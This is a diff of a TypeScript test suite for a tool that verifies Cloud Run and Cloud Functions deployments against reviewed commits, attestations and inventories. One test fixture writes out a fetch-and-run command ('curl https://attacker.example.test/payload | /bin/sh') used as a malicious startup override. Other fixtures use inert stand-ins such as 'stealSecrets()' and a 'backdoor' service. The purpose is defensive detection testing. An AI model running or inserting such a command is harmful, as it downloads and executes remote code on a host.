@@ -187,22 +187,34 @@ function tarArchive(files: Record<string, Uint8Array>): Uint8Array {
 const IMAGE_SOURCE_TAR = gzipSync(tarArchive({
   './package.json': new TextEncoder().encode(FUNCTION_PACKAGE),
 }));
-const IMAGE_LAYER = gzipSync(tarArchive({
+const IMAGE_LAYER_EXPANDED = tarArchive({
   '/layers/google.utils.archive-source/src/source-code.tar.gz': IMAGE_SOURCE_TAR,
-}));
+  '/workspace/package.json': new TextEncoder().encode(FUNCTION_PACKAGE),
+});
+const IMAGE_LAYER = gzipSync(IMAGE_LAYER_EXPANDED);
 const IMAGE_LAYER_DIGEST = `sha256:${hash(IMAGE_LAYER)}`;
 const IMAGE_CONFIG = {
+  architecture: 'amd64',
   config: {Labels: {
     'google.build-id': '11111111-1111-1111-1111-111111111111',
     'google.source':
       'gs://gcf-v2-sources-123456789-europe-west1/publicweb/function-source.zip#123',
   }},
+  created: '2026-01-01T00:00:30Z',
+  history: [{}],
+  os: 'linux',
+  rootfs: {type: 'layers', diff_ids: [`sha256:${hash(IMAGE_LAYER_EXPANDED)}`]},
 };
 const IMAGE_CONFIG_BYTES = new TextEncoder().encode(JSON.stringify(IMAGE_CONFIG));
 const IMAGE_CONFIG_DIGEST = `sha256:${hash(IMAGE_CONFIG_BYTES)}`;
 const IMAGE_MANIFEST = {
   schemaVersion: 2,
-  config: {digest: IMAGE_CONFIG_DIGEST},
+  mediaType: 'application/vnd.docker.distribution.manifest.v2+json',
+  config: {
+    mediaType: 'application/vnd.docker.container.image.v1+json',
+    size: IMAGE_CONFIG_BYTES.byteLength,
+    digest: IMAGE_CONFIG_DIGEST,
+  },
   layers: [{
     mediaType: 'application/vnd.docker.image.rootfs.diff.tar.gzip',
     size: IMAGE_LAYER.byteLength,
@@ -211,6 +223,24 @@ const IMAGE_MANIFEST = {
 };
 const IMAGE_MANIFEST_BYTES = new TextEncoder().encode(JSON.stringify(IMAGE_MANIFEST));
 const IMAGE_DIGEST = `sha256:${hash(IMAGE_MANIFEST_BYTES)}`;
+const IMAGE_RUNTIME_FILES = [
+  {
+    path: '/layers/google.utils.archive-source/src/source-code.tar.gz',
+    type: 'file' as const,
+    mode: 0o644,
+    uid: 0,
+    gid: 0,
+    sha256: hash(IMAGE_SOURCE_TAR),
+  },
+  {
+    path: '/workspace/package.json',
+    type: 'file' as const,
+    mode: 0o644,
+    uid: 0,
+    gid: 0,
+    sha256: hash(FUNCTION_PACKAGE),
+  },
+];
 const AUTH_API = {
   authorizedDomains: ['test-project.firebaseapp.com', 'test-project.web.app'],
   signIn: {email: {enabled: true, passwordRequired: true}},
@@ -258,6 +288,7 @@ const expectedFunction = {
   functionIam: [{role: 'roles/cloudfunctions.invoker', members: ['allUsers']}],
   runIam: null,
   event: null,
+  runtimeAttestation: null,
 };
 
 const expectedGen2Function = {
@@ -273,6 +304,12 @@ const expectedGen2Function = {
   functionIam: [],
   runIam: [{role: 'roles/run.invoker', members: ['allUsers']}],
   event: null,
+  runtimeAttestation: {
+    deploymentCommit: 'b'.repeat(40),
+    imageDigest: IMAGE_DIGEST,
+    executionConfig: IMAGE_CONFIG.config,
+    files: IMAGE_RUNTIME_FILES,
+  },
 };
 
 const target: DeploymentTarget = {
@@ -292,6 +329,7 @@ const target: DeploymentTarget = {
   security: {
     gitOrigin: 'https://github.com/example/test-project.git',
     storageRulesRelease: 'test-project.firebasestorage.app',
+    runInventoryCheckpoint: '2025-12-31T00:00:00Z',
     authConfig: AUTH_TARGET,
     authProviders: EMPTY_AUTH_PROVIDERS,
     firebaseRulesReleases: [
@@ -394,6 +432,7 @@ const currentFunction: ObservedFunction = {
   imageBuildId: null,
   imageSource: null,
   imageSourceFiles: null,
+  imageRuntimeAttestation: null,
 };
 
 const RUN_CONFIGURATION = {
@@ -420,12 +459,15 @@ const RUN_CONFIGURATION = {
       image: 'europe-west1-docker.pkg.dev/test-project/gcf-artifacts/test--project__europe--west1__publicweb:version_1',
       baseImageUri:
         'europe-west1-docker.pkg.dev/serverless-runtimes/google-22-full/runtimes/nodejs22',
-      environmentNames: [
-        'EVENTARC_CLOUD_EVENT_SOURCE',
-        'FIREBASE_CONFIG',
-        'FUNCTION_TARGET',
-        'GCLOUD_PROJECT',
-        'LOG_EXECUTION_ID',
+      command: [],
+      args: [],
+      environment: [
+        {name: 'EVENTARC_CLOUD_EVENT_SOURCE', value:
+          'projects/test-project/locations/europe-west1/services/publicweb'},
+        {name: 'FIREBASE_CONFIG', value: JSON.stringify(target.firebaseConfig)},
+        {name: 'FUNCTION_TARGET', value: 'publicweb'},
+        {name: 'GCLOUD_PROJECT', value: 'test-project'},
+        {name: 'LOG_EXECUTION_ID', value: 'true'},
       ],
       resources: {
         limits: {cpu: '1', memory: '256Mi'},
@@ -433,6 +475,8 @@ const RUN_CONFIGURATION = {
         startupCpuBoost: true,
       },
       ports: [{name: 'http1', containerPort: 8080}],
+      workingDir: null,
+      livenessProbe: {},
       startupProbe: {
         timeoutSeconds: 240,
         periodSeconds: 240,
@@ -440,7 +484,12 @@ const RUN_CONFIGURATION = {
         tcpSocket: {port: 8080},
       },
       volumeMounts: [],
+      dependsOn: [],
     }],
+    serviceMesh: {},
+    encryptionKeyRevocationAction: null,
+    encryptionKeyShutdownDuration: null,
+    nodeSelector: {},
   },
   expectedService: 'projects/test-project/locations/europe-west1/services/publicweb',
 };
@@ -468,11 +517,12 @@ const RUN_SERVICE_API = {
       baseImageUri:
         'europe-west1-docker.pkg.dev/serverless-runtimes/google-22-full/runtimes/nodejs22',
       env: [
-        {name: 'FIREBASE_CONFIG'},
-        {name: 'GCLOUD_PROJECT'},
-        {name: 'EVENTARC_CLOUD_EVENT_SOURCE'},
-        {name: 'FUNCTION_TARGET'},
-        {name: 'LOG_EXECUTION_ID'},
+        {name: 'FIREBASE_CONFIG', value: JSON.stringify(target.firebaseConfig)},
+        {name: 'GCLOUD_PROJECT', value: 'test-project'},
+        {name: 'EVENTARC_CLOUD_EVENT_SOURCE', value:
+          'projects/test-project/locations/europe-west1/services/publicweb'},
+        {name: 'FUNCTION_TARGET', value: 'publicweb'},
+        {name: 'LOG_EXECUTION_ID', value: 'true'},
       ],
       resources: {
         limits: {cpu: '1', memory: '256Mi'},
@@ -497,6 +547,25 @@ const RUN_SERVICE_API = {
     percent: 100,
     tag: 'fh-version1',
     revision: 'publicweb-00001-test',
+  }],
+};
+
+const RUN_REVISION_API = {
+  name: 'projects/test-project/locations/europe-west1/services/publicweb/revisions/publicweb-00001-test',
+  service: 'publicweb',
+  scaling: {maxInstanceCount: 20},
+  timeout: '30s',
+  maxInstanceRequestConcurrency: 80,
+  serviceAccount: '123456789-compute@developer.gserviceaccount.com',
+  containers: [{
+    ...RUN_SERVICE_API.template.containers[0],
+    image:
+      `europe-west1-docker.pkg.dev/test-project/gcf-artifacts/test--project__europe--west1__publicweb@${IMAGE_DIGEST}`,
+    buildInfo: {
+      functionTarget: 'publicweb',
+      sourceLocation:
+        'gs://gcf-v2-sources-123456789-europe-west1/publicweb/function-source.zip#123',
+    },
   }],
 };
 
@@ -551,6 +620,11 @@ const currentGen2Function: ObservedFunction = {
   imageBuildId: '11111111-1111-1111-1111-111111111111',
   imageSource: 'gs://gcf-v2-sources-123456789-europe-west1/publicweb/function-source.zip#123',
   imageSourceFiles: FUNCTION_FILES,
+  imageRuntimeAttestation: {
+    imageDigest: IMAGE_DIGEST,
+    executionConfig: IMAGE_CONFIG.config,
+    files: IMAGE_RUNTIME_FILES,
+  },
 };
 
 function currentObserved(): ObservedDeployment {
@@ -755,7 +829,10 @@ function response(reply: MockReply): FetchResponse {
   };
 }
 
-function apiFixture(overrides = new Map<string, MockReply>()): {
+function apiFixture(
+  overrides = new Map<string, MockReply>(),
+  runAuditEntries: Record<string, unknown>[] = [],
+): {
   fetch: FetchLike;
   calls: Array<{
     url: string;
@@ -1017,13 +1094,7 @@ function apiFixture(overrides = new Map<string, MockReply>()): {
     ],
     [
       'https://run.googleapis.com/v2/projects/test-project/locations/europe-west1/services/publicweb/revisions/publicweb-00001-test',
-      {json: {
-        name: 'projects/test-project/locations/europe-west1/services/publicweb/revisions/publicweb-00001-test',
-        containers: [{
-          name: 'worker',
-          image: `europe-west1-docker.pkg.dev/test-project/gcf-artifacts/test--project__europe--west1__publicweb@${IMAGE_DIGEST}`,
-        }],
-      }},
+      {json: RUN_REVISION_API},
     ],
     [
       `https://europe-west1-docker.pkg.dev/v2/test-project/gcf-artifacts/test--project__europe--west1__publicweb/manifests/${IMAGE_DIGEST}`,
@@ -1059,6 +1130,12 @@ function apiFixture(overrides = new Map<string, MockReply>()): {
       {json: {services: [{
         name: 'projects/test-project/locations/europe-west1/services/publicweb',
       }], unreachable: []}},
+    ],
+    [
+      'https://cloudasset.googleapis.com/v1/projects/test-project:searchAllResources?assetTypes=run.googleapis.com%2FService&pageSize=500',
+      {json: {results: [{
+        name: '//run.googleapis.com/projects/test-project/locations/europe-west1/services/publicweb',
+      }]}},
     ],
     [
       'https://eventarc.googleapis.com/v1/projects/test-project/locations/-/triggers',
@@ -1270,10 +1347,96 @@ function apiFixture(overrides = new Map<string, MockReply>()): {
       method: init?.method,
       body: init?.body,
     });
+    if (url === 'https://logging.googleapis.com/v2/entries:list' && init?.body !== undefined) {
+      const body = JSON.parse(init.body) as {filter?: string};
+      if (body.filter?.includes('protoPayload.serviceName="run.googleapis.com"') === true) {
+        return response({json: {entries: runAuditEntries}});
+      }
+    }
     assert.equal(replies.has(url), true, `unexpected URL ${url}`);
     return response(replies.get(url)!);
   };
   return {fetch, calls};
+}
+
+function runtimeImageFixture(
+  expandedLayers: Uint8Array[],
+  executionConfig: Record<string, unknown> = IMAGE_CONFIG.config,
+): {fetch: FetchLike; digest: string} {
+  const layers = expandedLayers.map((expanded) => {
+    const bytes = gzipSync(expanded);
+    return {
+      bytes,
+      digest: 'sha256:' + hash(bytes),
+      diffId: 'sha256:' + hash(expanded),
+    };
+  });
+  const imageConfig = {
+    ...IMAGE_CONFIG,
+    config: executionConfig,
+    rootfs: {type: 'layers', diff_ids: layers.map(({diffId}) => diffId)},
+  };
+  const configBytes = new TextEncoder().encode(JSON.stringify(imageConfig));
+  const configDigest = 'sha256:' + hash(configBytes);
+  const manifest = {
+    schemaVersion: 2,
+    mediaType: 'application/vnd.docker.distribution.manifest.v2+json',
+    config: {
+      mediaType: 'application/vnd.docker.container.image.v1+json',
+      size: configBytes.byteLength,
+      digest: configDigest,
+    },
+    layers: layers.map(({bytes, digest}) => ({
+      mediaType: 'application/vnd.docker.image.rootfs.diff.tar.gzip',
+      size: bytes.byteLength,
+      digest,
+    })),
+  };
+  const manifestBytes = new TextEncoder().encode(JSON.stringify(manifest));
+  const digest = 'sha256:' + hash(manifestBytes);
+  const imageBase =
+    'europe-west1-docker.pkg.dev/test-project/gcf-artifacts/test--project__europe--west1__publicweb';
+  const registryBase =
+    'https://europe-west1-docker.pkg.dev/v2/test-project/gcf-artifacts/test--project__europe--west1__publicweb';
+  const image = imageBase + '@' + digest;
+  const revision = structuredClone(RUN_REVISION_API);
+  revision.containers[0].image = image;
+  const overrides = new Map<string, MockReply>([
+    [
+      'https://run.googleapis.com/v2/projects/test-project/locations/europe-west1/services/publicweb/revisions/publicweb-00001-test',
+      {json: revision},
+    ],
+    [registryBase + '/manifests/' + digest, {body: manifestBytes}],
+    [
+      'https://artifactregistry.googleapis.com/v1/projects/test-project/locations/europe-west1/repositories/gcf-artifacts/dockerImages/test--project__europe--west1__publicweb%40' + digest,
+      {json: {
+        uri: image,
+        tags: ['latest', 'version_1'],
+        uploadTime: '2026-01-01T00:00:30Z',
+        updateTime: '2026-01-01T00:00:31Z',
+      }},
+    ],
+    [registryBase + '/blobs/' + configDigest, {body: configBytes}],
+    ...layers.map(({bytes, digest: layerDigest}) => [
+      registryBase + '/blobs/' + layerDigest,
+      {body: bytes},
+    ] as [string, MockReply]),
+  ]);
+  const fixture = apiFixture(overrides);
+  const fetch: FetchLike = async (url, init) => {
+    const original = await fixture.fetch(url, init);
+    if (url !== 'https://logging.googleapis.com/v2/entries:list') return original;
+    const request = JSON.parse(init!.body!) as {filter: string};
+    if (!request.filter.includes('logs/cloudbuild')) return original;
+    const body = structuredClone(await original.json()) as {
+      entries: Array<Record<string, unknown>>;
+    };
+    const output = body.entries.find((entry) =>
+      entry.logName === 'projects/test-project/logs/cloudbuild')!;
+    output.textPayload = 'Step #2 - "build": *** Images (' + digest + '):';
+    return response({json: body});
+  };
+  return {fetch, digest};
 }
 
 test('reads live APIs, stops on an empty page token, and withholds credentials from Hosting', async () => {
@@ -1365,6 +1528,45 @@ test('rejects stale tagged revisions and a repointed Gen 2 container image', asy
   assert.ok(problems.includes('Cloud Run container image does not match the reviewed Function: europe-west1/publicweb'));
 });
 
+test('rejects matching malicious Cloud Run startup overrides in the service and revision', async () => {
+  const service = structuredClone(RUN_SERVICE_API);
+  const revision = structuredClone(RUN_REVISION_API);
+  for (const container of [
+    service.template.containers[0], revision.containers[0],
+  ] as Array<Record<string, unknown>>) {
+    container.command = ['/bin/sh'];
+    container.args = ['-c', 'curl https://attacker.example.test/payload | /bin/sh'];
+  }
+  const fixture = apiFixture(new Map([
+    [
+      'https://run.googleapis.com/v2/projects/test-project/locations/europe-west1/services/publicweb',
+      {json: service},
+    ],
+    [
+      'https://run.googleapis.com/v2/projects/test-project/locations/europe-west1/services/publicweb/revisions/publicweb-00001-test',
+      {json: revision},
+    ],
+  ]));
+  const observed = await readObservedDeployment(fixture.fetch, expected, 'dummy-token');
+  assert.equal(deploymentProblems(expected, observed).includes(
+    'Cloud Run configuration mismatch: europe-west1/publicweb',
+  ), true);
+});
+
+test('rejects Cloud Run execution settings that differ between service and immutable revision', async () => {
+  const revision = structuredClone(RUN_REVISION_API);
+  revision.containers[0].env = revision.containers[0].env.map((entry) =>
+    entry.name === 'FUNCTION_TARGET' ? {...entry, value: 'attacker'} : entry);
+  const fixture = apiFixture(new Map([[
+    'https://run.googleapis.com/v2/projects/test-project/locations/europe-west1/services/publicweb/revisions/publicweb-00001-test',
+    {json: revision},
+  ]]));
+  await assert.rejects(
+    readObservedDeployment(fixture.fetch, expected, 'dummy-token'),
+    /immutable revision execution settings differ/,
+  );
+});
+
 test('uses the generation-matched source API and inventories standalone Run services', async () => {
   const fixture = apiFixture();
   const observed = await readObservedDeployment(fixture.fetch, expected, 'dummy-token');
@@ -1395,6 +1597,14 @@ test('rechecks every unreachable Run region and exposes a hidden service', async
         name: 'projects/test-project/locations/us-central1/services/backdoor',
       }], unreachable: []}},
     ],
+    [
+      'https://cloudasset.googleapis.com/v1/projects/test-project:searchAllResources?assetTypes=run.googleapis.com%2FService&pageSize=500',
+      {json: {results: [{
+        name: '//run.googleapis.com/projects/test-project/locations/europe-west1/services/publicweb',
+      }, {
+        name: '//run.googleapis.com/projects/test-project/locations/us-central1/services/backdoor',
+      }]}},
+    ],
   ]));
   const observed = await readObservedDeployment(fixture.fetch, expected, 'dummy-token');
   assert.equal(deploymentProblems(expected, observed).includes(
@@ -1402,7 +1612,7 @@ test('rechecks every unreachable Run region and exposes a hidden service', async
   ), true);
 });
 
-test('accepts an unreachable Run region only with a location-policy proof', async () => {
+test('accepts an unreachable Run region with location-policy, asset, and audit proof', async () => {
   const restricted = 'us-central2';
   const fixture = apiFixture(new Map([
     [
@@ -1447,6 +1657,77 @@ test('accepts an unreachable Run region only with a location-policy proof', asyn
   );
 });
 
+test('finds a pre-existing Run service through Cloud Asset despite a denied region', async () => {
+  const restricted = 'us-central2';
+  const wildcard =
+    'https://run.googleapis.com/v2/projects/test-project/locations/-/services';
+  const regional =
+    'https://run.googleapis.com/v2/projects/test-project/locations/' + restricted + '/services';
+  const assets =
+    'https://cloudasset.googleapis.com/v1/projects/test-project:searchAllResources?assetTypes=run.googleapis.com%2FService&pageSize=500';
+  const fixture = apiFixture(new Map([
+    [wildcard, {json: {services: [{
+      name: 'projects/test-project/locations/europe-west1/services/publicweb',
+    }], unreachable: [restricted]}}],
+    [regional, {status: 403, json: {error: {
+      status: 'PERMISSION_DENIED',
+      details: [{
+        '@type': 'type.googleapis.com/google.rpc.ErrorInfo',
+        reason: 'LOCATION_POLICY_VIOLATED',
+        metadata: {location: restricted},
+      }],
+    }}}],
+    [assets, {json: {results: [{
+      name: '//run.googleapis.com/projects/test-project/locations/europe-west1/services/publicweb',
+    }, {
+      name: '//run.googleapis.com/projects/test-project/locations/us-central2/services/backdoor',
+    }]}}],
+  ]));
+  const observed = await readObservedDeployment(fixture.fetch, expected, 'dummy-token');
+  assert.equal(deploymentProblems(expected, observed).includes(
+    'Cloud Run services do not match the reviewed Functions',
+  ), true);
+});
+
+test('rejects a Run inventory checkpoint when audit logs contain a later mutation', async () => {
+  const fixture = apiFixture(new Map(), [{
+    timestamp: '2026-01-01T00:00:00Z',
+    protoPayload: {
+      serviceName: 'run.googleapis.com',
+      methodName: 'google.cloud.run.v1.Services.ReplaceService',
+    },
+  }]);
+  await assert.rejects(
+    readObservedDeployment(fixture.fetch, expected, 'dummy-token'),
+    /Cloud Run changed after the reviewed inventory checkpoint/,
+  );
+});
+
+test('rejects a direct Run service until Cloud Asset inventory has converged', async () => {
+  const fixture = apiFixture(new Map([[
+    'https://run.googleapis.com/v2/projects/test-project/locations/-/services',
+    {json: {services: [{
+      name: 'projects/test-project/locations/europe-west1/services/publicweb',
+    }, {
+      name: 'projects/test-project/locations/europe-west1/services/backdoor',
+    }], unreachable: []}},
+  ]]));
+  await assert.rejects(
+    readObservedDeployment(fixture.fetch, expected, 'dummy-token'),
+    /Cloud Asset has not converged/,
+  );
+});
+
+test('keeps deployment blocked until a reviewed Run inventory checkpoint exists', async () => {
+  const pending = structuredClone(expected);
+  pending.target.security.runInventoryCheckpoint = null;
+  const fixture = apiFixture();
+  const observed = await readObservedDeployment(fixture.fetch, pending, 'dummy-token');
+  assert.equal(deploymentProblems(pending, observed).includes(
+    'Cloud Run inventory checkpoint is pending',
+  ), true);
+});
+
 test('inventories Eventarc, Storage rules, Auth, identities, secrets, and build resources', async () => {
   const fixture = apiFixture();
   const observed = await readObservedDeployment(fixture.fetch, expected, 'dummy-token');
@@ -1487,13 +1768,23 @@ test('rejects an overwritten Gen 2 source generation and a same-package replacem
   const attackerSourceTar = gzipSync(tarArchive({
     './package.json': new TextEncoder().encode('{"name":"attacker"}\n'),
   }));
-  const attackerLayer = gzipSync(tarArchive({
+  const attackerLayerExpanded = tarArchive({
     '/layers/google.utils.archive-source/src/source-code.tar.gz': attackerSourceTar,
-  }));
+  });
+  const attackerLayer = gzipSync(attackerLayerExpanded);
   const attackerLayerDigest = `sha256:${hash(attackerLayer)}`;
+  const attackerConfig = structuredClone(IMAGE_CONFIG);
+  attackerConfig.rootfs.diff_ids = [`sha256:${hash(attackerLayerExpanded)}`];
+  const attackerConfigBytes = new TextEncoder().encode(JSON.stringify(attackerConfig));
+  const attackerConfigDigest = `sha256:${hash(attackerConfigBytes)}`;
   const attackerManifest = {
     schemaVersion: 2,
-    config: {digest: IMAGE_CONFIG_DIGEST},
+    mediaType: 'application/vnd.docker.distribution.manifest.v2+json',
+    config: {
+      mediaType: 'application/vnd.docker.container.image.v1+json',
+      size: attackerConfigBytes.byteLength,
+      digest: attackerConfigDigest,
+    },
     layers: [{
       mediaType: 'application/vnd.docker.image.rootfs.diff.tar.gzip',
       size: attackerLayer.byteLength,
@@ -1504,13 +1795,8 @@ test('rejects an overwritten Gen 2 source generation and a same-package replacem
   const attackerDigest = `sha256:${hash(attackerManifestBytes)}`;
   const attackerImage =
     `europe-west1-docker.pkg.dev/test-project/gcf-artifacts/test--project__europe--west1__publicweb@${attackerDigest}`;
-  const replacedRevision = {
-    name: 'projects/test-project/locations/europe-west1/services/publicweb/revisions/publicweb-00001-test',
-    containers: [{
-      name: 'worker',
-      image: attackerImage,
-    }],
-  };
+  const replacedRevision = structuredClone(RUN_REVISION_API);
+  replacedRevision.containers[0].image = attackerImage;
   const imageFixture = apiFixture(new Map([
     [
       'https://run.googleapis.com/v2/projects/test-project/locations/europe-west1/services/publicweb/revisions/publicweb-00001-test',
@@ -1530,6 +1816,10 @@ test('rejects an overwritten Gen 2 source generation and a same-package replacem
       }},
     ],
     [
+      `https://europe-west1-docker.pkg.dev/v2/test-project/gcf-artifacts/test--project__europe--west1__publicweb/blobs/${attackerConfigDigest}`,
+      {body: attackerConfigBytes},
+    ],
+    [
       `https://europe-west1-docker.pkg.dev/v2/test-project/gcf-artifacts/test--project__europe--west1__publicweb/blobs/${attackerLayerDigest}`,
       {body: attackerLayer},
     ],
@@ -1545,6 +1835,8 @@ test('rejects an overwritten Gen 2 source generation and a same-package replacem
   const overwrittenDuringBuild: FetchLike = async (url, init) => {
     const original = await imageFixture.fetch(url, init);
     if (url !== 'https://logging.googleapis.com/v2/entries:list') return original;
+    const request = JSON.parse(init!.body!) as {filter: string};
+    if (!request.filter.includes('logs/cloudbuild')) return original;
     const body = structuredClone(await original.json()) as {
       entries: Array<Record<string, unknown>>;
     };
@@ -1562,6 +1854,50 @@ test('rejects an overwritten Gen 2 source generation and a same-package replacem
   ), false);
   assert.equal(raceProblems.includes(
     'Cloud Run image source does not match the reviewed commit: europe-west1/publicweb',
+  ), true);
+});
+
+test('rejects a malicious executable layer even when source and build provenance match', async () => {
+  const maliciousLayer = tarArchive({
+    '/layers/google.utils.archive-source/src/source-code.tar.gz': IMAGE_SOURCE_TAR,
+    '/workspace/package.json': new TextEncoder().encode(FUNCTION_PACKAGE),
+    '/workspace/attacker.js': new TextEncoder().encode('stealSecrets();\n'),
+  });
+  const fixture = runtimeImageFixture([maliciousLayer]);
+  const observed = await readObservedDeployment(fixture.fetch, expected, 'dummy-token');
+  const problems = deploymentProblems(expected, observed);
+  assert.equal(problems.includes(
+    'Cloud Run image provenance does not match the immutable Function build: europe-west1/publicweb',
+  ), false);
+  assert.equal(problems.includes(
+    'Cloud Run image source does not match the reviewed commit: europe-west1/publicweb',
+  ), false);
+  assert.equal(problems.includes(
+    'Cloud Run executable image does not match the reviewed attestation: europe-west1/publicweb',
+  ), true);
+});
+
+test('rejects an OCI entrypoint override even when its source tree is reviewed', async () => {
+  const fixture = runtimeImageFixture([IMAGE_LAYER_EXPANDED], {
+    ...IMAGE_CONFIG.config,
+    Entrypoint: ['/workspace/attacker'],
+    Cmd: ['--exfiltrate'],
+  });
+  const observed = await readObservedDeployment(fixture.fetch, expected, 'dummy-token');
+  assert.equal(deploymentProblems(expected, observed).includes(
+    'Cloud Run executable image does not match the reviewed attestation: europe-west1/publicweb',
+  ), true);
+});
+
+test('applies opaque OCI whiteouts before comparing the effective runtime filesystem', async () => {
+  const overlay = tarArchive({
+    '/workspace/.wh..wh..opq': new Uint8Array(),
+    '/workspace/attacker.js': new TextEncoder().encode('stealSecrets();\n'),
+  });
+  const fixture = runtimeImageFixture([IMAGE_LAYER_EXPANDED, overlay]);
+  const observed = await readObservedDeployment(fixture.fetch, expected, 'dummy-token');
+  assert.equal(deploymentProblems(expected, observed).includes(
+    'Cloud Run executable image does not match the reviewed attestation: europe-west1/publicweb',
   ), true);
 });
 
@@ -1795,6 +2131,14 @@ test('rejects resource IAM, key, rule, Auth, Run, and Eventarc drift from API mo
         {name: 'projects/test-project/locations/europe-west1/services/publicweb'},
         {name: 'projects/test-project/locations/europe-west1/services/backdoor'},
       ], unreachable: []}},
+    ],
+    [
+      'https://cloudasset.googleapis.com/v1/projects/test-project:searchAllResources?assetTypes=run.googleapis.com%2FService&pageSize=500',
+      {json: {results: [{
+        name: '//run.googleapis.com/projects/test-project/locations/europe-west1/services/publicweb',
+      }, {
+        name: '//run.googleapis.com/projects/test-project/locations/europe-west1/services/backdoor',
+      }]}},
     ],
     [
       'https://eventarc.googleapis.com/v1/projects/test-project/locations/-/triggers',
@@ -2098,7 +2442,14 @@ function gitFixture(
   localConfig = '',
   configOrigin = 'file:.git/config',
 ): GitRunner {
+  const parentTarget = structuredClone(target);
+  parentTarget.security.runInventoryCheckpoint = null;
+  for (const function_ of parentTarget.functions) {
+    if (function_.generation === 'GEN_2') function_.runtimeAttestation = null;
+  }
   const files = new Map<string, Buffer>([
+    ['show ' + 'b'.repeat(40) + ':deployment-target.json',
+      Buffer.from(JSON.stringify(parentTarget))],
     [`show ${COMMIT}:deployment-target.json`, Buffer.from(JSON.stringify(target))],
     [`show ${COMMIT}:firebase.json`, Buffer.from(JSON.stringify(FIREBASE_JSON))],
     [`show ${COMMIT}:firestore.indexes.json`, Buffer.from(JSON.stringify({
@@ -2117,6 +2468,9 @@ function gitFixture(
     }))],
     ['rev-parse HEAD', Buffer.from(`${head}\n`)],
     ['rev-parse origin/master', Buffer.from(`${pushed}\n`)],
+    [`rev-parse ${COMMIT}^`, Buffer.from(`${'b'.repeat(40)}\n`)],
+    [`diff-tree --no-commit-id --name-only -r ${'b'.repeat(40)} ${COMMIT}`,
+      Buffer.from('deployment-target.json\n')],
     ['ls-remote --exit-code origin refs/heads/master', Buffer.from(
       `${remote}\trefs/heads/master\n`,
     )],
@@ -2124,6 +2478,7 @@ function gitFixture(
     ['config --list --show-origin -z', Buffer.from(
       localConfig === '' ? '' : `${configOrigin}\0${localConfig}`,
     )],
+    ['replace -l', Buffer.from('')],
     ['status --porcelain=v1 -z --untracked-files=all', Buffer.from(status)],
     [
       'ls-files --others --ignored --exclude-standard -z -- :(glob)functions/.env*',
@@ -2252,12 +2607,66 @@ test('rejects a mismatched commit and dirty deploy inputs while allowing reviewe
     ),
     ['Git URL rewrite can spoof origin'],
   );
+  const base = gitFixture();
+  const replacementGit: GitRunner = (arguments_) =>
+    arguments_.join(' ') === 'replace -l' ? Buffer.from('a'.repeat(40) + '\n') :
+      base(arguments_);
+  assert.deepEqual(reviewedTreeProblems(COMMIT, target, replacementGit), [
+    'Git replacement refs can spoof reviewed objects',
+  ]);
+  const alteredTarget = structuredClone(target);
+  alteredTarget.releaseId = 'attacker-approved-release';
+  assert.deepEqual(reviewedTreeProblems(COMMIT, alteredTarget, gitFixture()), [
+    'Runtime attestation commit changes non-attestation deployment targets',
+  ]);
 });
 
 test('rejects unknown, empty, duplicate, and obsolete timestamp arguments', () => {
   assert.throws(() => parseOptions(['--deployed-after=2026-08-25T21:00:00Z']), /unknown argument/);
   assert.throws(() => parseOptions(['--commit=']), /requires a value/);
   assert.throws(() => parseOptions(['--project=first', '--project=second']), /duplicate argument/);
+});
+
+test('capture mode emits target-only runtime attestations after all other checks pass', async () => {
+  const pendingTarget = structuredClone(target);
+  pendingTarget.security.runInventoryCheckpoint = null;
+  for (const function_ of pendingTarget.functions) {
+    if (function_.generation === 'GEN_2') function_.runtimeAttestation = null;
+  }
+  const base = gitFixture();
+  const runGit: GitRunner = (arguments_) =>
+    arguments_.join(' ') === 'show ' + COMMIT + ':deployment-target.json' ?
+      Buffer.from(JSON.stringify(pendingTarget)) : base(arguments_);
+  const fixture = apiFixture();
+  const output: string[] = [];
+  const errors: string[] = [];
+  const result = await runCli(
+    ['--commit=' + COMMIT, '--project=test-project', '--mode=capture'],
+    {
+      root: process.cwd(),
+      runGit,
+      fetch: fixture.fetch,
+      accessToken: () => 'dummy-token',
+      now: () => new Date('2026-01-02T03:04:05Z'),
+      stdout: (message) => output.push(message),
+      stderr: (message) => errors.push(message),
+    },
+  );
+  assert.equal(result, 0);
+  assert.deepEqual(errors, []);
+  assert.deepEqual(JSON.parse(output.join('')), {
+    security: {runInventoryCheckpoint: '2026-01-02T03:04:05.000Z'},
+    functions: [{
+      name: 'publicweb',
+      region: 'europe-west1',
+      runtimeAttestation: {
+        deploymentCommit: COMMIT,
+        imageDigest: IMAGE_DIGEST,
+        executionConfig: IMAGE_CONFIG.config,
+        files: IMAGE_RUNTIME_FILES,
+      },
+    }],
+  });
 });
 
 test('runCli returns distinct success and dirty-tree failure codes', async () => {
